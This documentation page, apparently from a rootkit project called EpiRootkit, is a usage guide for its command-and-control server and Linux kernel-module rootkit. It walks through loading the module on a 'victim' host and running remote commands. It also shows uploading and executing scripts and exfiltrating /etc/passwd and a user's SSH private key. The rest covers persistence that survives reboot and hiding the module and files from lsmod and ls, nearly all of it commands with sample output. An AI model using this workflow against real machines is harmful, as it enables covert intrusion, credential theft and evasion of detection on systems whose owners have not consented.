---
title: "Usage & Workflows"
description: "Usage scenarios and workflows"
icon: "play_arrow"
date: "2025-05-25T00:00:00+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 303
---



## Quick Start

### 1. Start C2 Server
```bash
cd attacking_program
pnpm start
# ✓ Server started on port 4444
# ✓ Web interface started on port 3000
```

### 2. Install Rootkit (Victim)
```bash
sudo insmod epirootkit.ko
# C2 server shows: ✓ Client-1 Connected
```

### 3. Authenticate
```bash
auth Client-1 password
# ✓ [2025-05-25 16:13:30] Authenticated
# SUCCESS: Authentication successful
```

## Basic Workflows

### Client Management
```bash
# List clients
ls
# • Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM
# • Client-2 - UNAUTHENTICATED - Last seen: 6:10:15 PM

# Check status
status Client-1
# EpiRootkit Status:
# Version: 1.0.0
# Authentication: YES
# Module Hidden: YES
# Persistence: ENABLED

# Monitor connection
keepalive Client-1
# Last ping: 2025-05-25 16:14:00
# Connection: STABLE
```

### Command Execution
```bash
# System reconnaissance
exec Client-1 whoami
# Exit code: 0
# Output: root

exec Client-1 uname -a
# Linux victim 5.4.0-74-generic #83-Ubuntu x86_64 GNU/Linux

exec Client-1 ps aux | head -5
# USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
# root         1  0.0  0.1 225468  9876 ?        Ss   15:00   0:01 /sbin/init

# Network information
exec Client-1 ip addr show
exec Client-1 netstat -tuln
```

### File Transfer
```bash
# Upload files
upload Client-1 ./script.sh /tmp/script.sh
# ✓ File uploaded successfully (512 bytes)

exec Client-1 chmod +x /tmp/script.sh
exec Client-1 /tmp/script.sh

# Download files
download Client-1 /etc/passwd ./passwd
# ✓ File downloaded successfully (2048 bytes)

download Client-1 /home/user/.ssh/id_rsa ./keys/
# ✓ File downloaded successfully (1679 bytes)
```

## Advanced Workflows

### Persistence Setup
```bash
# Install all persistence mechanisms
persist Client-1 install
# SUCCESS: All persistence mechanisms installed

# Test persistence (victim reboots)
exec Client-1 reboot
# Wait for reconnection...

ls
# • Client-1 - UNAUTHENTICATED - Last seen: Just now

auth Client-1 password
status Client-1
# Persistence: ENABLED (survived reboot)
```

### Stealth Operations
```bash
# Check current stealth status
status Client-1
# Module Hidden: YES
# File Hiding: YES

# Test module hiding
exec Client-1 lsmod | grep epirootkit
# (no output - module hidden)

# Test file hiding
exec Client-1 touch /tmp/epirootkit_test
exec Client-1 ls /tmp/ | grep epirootkit
# (no output - file hidden)

# But file still accessible
exec Client-1 cat /tmp/epirootkit_test
# (works normally)
```

### Configuration Management
```bash
# Interactive configuration
config Client-1
# ┌─ Configuration - Client-1
#   [X] Module Hiding (Click to disable)
#   [X] File Hiding (Click to disable)
#   [X] Persistence (Click to disable)

# Direct commands
hide_module Client-1
# SUCCESS: Module hidden

unhide_module Client-1
# SUCCESS: Module visible

hide_files Client-1
# SUCCESS: File hiding enabled
```